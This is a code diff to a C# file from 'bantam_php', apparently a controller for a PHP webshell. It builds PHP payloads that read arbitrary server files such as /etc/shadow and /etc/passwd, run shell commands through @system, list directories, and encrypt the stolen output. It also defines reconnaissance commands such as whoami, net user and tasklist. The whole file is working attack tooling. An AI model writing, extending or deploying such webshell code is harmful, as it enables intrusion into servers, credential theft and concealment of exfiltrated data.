@@ -39,16 +39,23 @@ namespace bantam_php
             PHP_VERSION
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="code"></param>
-        /// <returns></returns>
-        public static string minifyCode(string code)
-        {
-            string clean = Regex.Replace(code, @"\t|\n|\r", "");
-            return Regex.Replace(clean, @"\s+", " ");
-        }
+        public static string linuxFS_ShadowFile = "/etc/shadow";
+        public static string linuxFS_PasswdFile = "/etc/passwd";
+        public static string linuxFS_IssueFile = "/etc/issue.net";
+        public static string linuxFS_hostTargetsFile = "/etc/hosts";
+        public static string linuxFS_ProcVersion = "/proc/version";
+        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
+
+        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+        public static string linuxOS_PsAux = "ps aux";
+        public static string linuxOS_Ifconfig = "ifconfig";
+        public static string windowsOS_Ipconfig = "ipconfig";
+        public static string windowsOS_TaskList = "tasklist";
+        public static string windowsOS_NetUser = "net user";
+        public static string windowsOS_NetAccounts = "net accounts";
+        public static string windowsOS_Ver = "ver";
+        public static string posixOS_Whoami = "whoami";
 
         /// <summary>
         /// 
@@ -95,38 +102,14 @@ namespace bantam_php
              + "'.$group.'" + colSeperator
             + "'.$phpVersion;";
 
-        public static string readFileProcedure(string fileName)
-        {
-            return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
-        }
-
-        public static string executeSystemCode(string code)
-        {
-            //todo: abstract now it's time to make the function that executes the code dynamic
-            return "@system('" + code + "');";
-        }
-
-        public static string linuxFS_ShadowFile = "/etc/shadow";
-        public static string linuxFS_PasswdFile = "/etc/passwd";
-        public static string linuxFS_IssueFile = "/etc/issue.net";
-        public static string linuxFS_hostTargetsFile = "/etc/hosts";
-        public static string linuxFS_ProcVersion = "/proc/version";
-        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
-
-        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
-
-        public static string linuxOS_PsAux = "ps aux";
-        public static string linuxOS_Ifconfig = "ifconfig";
-        public static string windowsOS_Ipconfig = "ipconfig";
-        public static string windowsOS_TaskList = "tasklist";
-        public static string windowsOS_NetUser = "net user";
-        public static string windowsOS_NetAccounts = "net accounts";
-        public static string windowsOS_Ver = "ver";
-        public static string posixOS_Whoami = "whoami";
-
-
+        /// <summary>
+        /// 
+        /// </summary>
         public static string phpInfo = "phpinfo();";
 
+        /// <summary>
+        /// 
+        /// </summary>
         public static string phpTestExecutionWithEcho = "echo '1';";
 
         /// <summary>
@@ -182,13 +165,46 @@ namespace bantam_php
         //        }";
         //    }
 
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="fileName"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string ReadFileProcedure(string fileName, bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
+                       + EncryptionHelper.encryptPhpResult();
+            } else {
+                return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="code"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string ExecuteSystemCode(string code, bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return "ob_start(); @system( " + code + "); $result = ob_get_contents(); ob_end_clean();"
+                       + EncryptionHelper.encryptPhpResult();
+            } else {
+                return "@system('" + code + "');";
+            }
+        }
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
         /// <returns></returns>
-        public static string getDirectoryEnumerationCode(string location, string phpVersion)
+        public static string getDirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
         {
             //We cannot use the lambda function in usort below php version 5.2 :(
             //TODO move this version holder / checker else where to a function
@@ -198,19 +214,47 @@ namespace bantam_php
                 if (Convert.ToInt32(version[0]) > 5
                 || (Convert.ToInt32(version[0]) == 5 && Convert.ToInt32(version[1]) >= 3)) {
                     sortCode =
-                    @" if(version_compare(phpversion(), '5.3.0', '>='))
-                    {
-                        if (!empty($dirs))
-                        {
-                            usort($dirs, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
-                        }
+                    @"if (!empty($dirs)) {
+                        usort($dirs, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
+                    }
 
-                        if (!empty($files))
-                        {
-                            usort($files, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
-                        }
-                    } ";
+                    if (!empty($files)) {
+                        usort($files, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
+                    }";
                 }
+            }
+
+            string responseCode = "";
+            if (responseEncryption) {
+                responseCode = @"$result; foreach ($dirs as $dir) {
+                    $result .= $dir['name']. '" + colSeperator
+                   + @"'.$dir['path'].'" + colSeperator
+                   + @"'.$dir['size'].'" + colSeperator
+                   + @"'.$dir['type'].'" + colSeperator
+                   + @"'.$dir['perms'].'" + rowSeperator + @"';
+                    }
+                    foreach($files as $file) {
+                        $result .= $file['name'] . '" + colSeperator
+                   + "'.$file['path'].'" + colSeperator
+                   + "'.$file['size'].'" + colSeperator
+                   + "'.$file['type'].'" + colSeperator
+                   + "'.$dir['perms'].'" + rowSeperator + @"';
+                    }" + EncryptionHelper.encryptPhpResult();
+            } else {
+                responseCode = @"foreach($dirs as $dir) {
+                    echo $dir['name']. '" + colSeperator
+                   + @"'.$dir['path'].'" + colSeperator
+                   + @"'.$dir['size'].'" + colSeperator
+                   + @"'.$dir['type'].'" + colSeperator
+                   + @"'.$dir['perms'].'" + rowSeperator + @"';
+                    }
+                    foreach($files as $file) {
+                        echo $file['name'] . '" + colSeperator
+                   + "'.$file['path'].'" + colSeperator
+                   + "'.$file['size'].'" + colSeperator
+                   + "'.$file['type'].'" + colSeperator
+                   + "'.$dir['perms'].'" + rowSeperator + @"';
+                    }";
             }
 
             return @"$dirs = $files = array();
@@ -253,28 +297,29 @@ namespace bantam_php
                                 'size' => ''
 				            ));
 			            }
-		            }" + sortCode + @"
-
-                    foreach ($dirs as $dir) {
-                        echo $dir['name'] . '" + colSeperator
-                        + @"'.$dir['path'].'" + colSeperator
-                        + @"'.$dir['size'].'" + colSeperator
-                        + @"'.$dir['type'].'" + colSeperator
-                        + @"'.$dir['perms'].'" + rowSeperator + @"';
-                    }
-                    foreach($files as $file) {
-                        echo $file['name'] . '" + colSeperator
-                        + "'.$file['path'].'" + colSeperator
-                        + "'.$file['size'].'" + colSeperator
-                        + "'.$file['type'].'" + colSeperator
-                        + "'.$dir['perms'].'" + rowSeperator + @"';
-                    }
+		            }" + sortCode + responseCode + @"
                 }catch(Exception $e){  }";
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="windowsOS"></param>
+        /// <returns></returns>
         public static string getTaskListFunction(bool windowsOS = true)
         {
             return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="code"></param>
+        /// <returns></returns>
+        public static string MinifyCode(string code)
+        {
+            string clean = Regex.Replace(code, @"\t|\n|\r", "");
+            return Regex.Replace(clean, @"\s+", " ");
         }
     }
 }
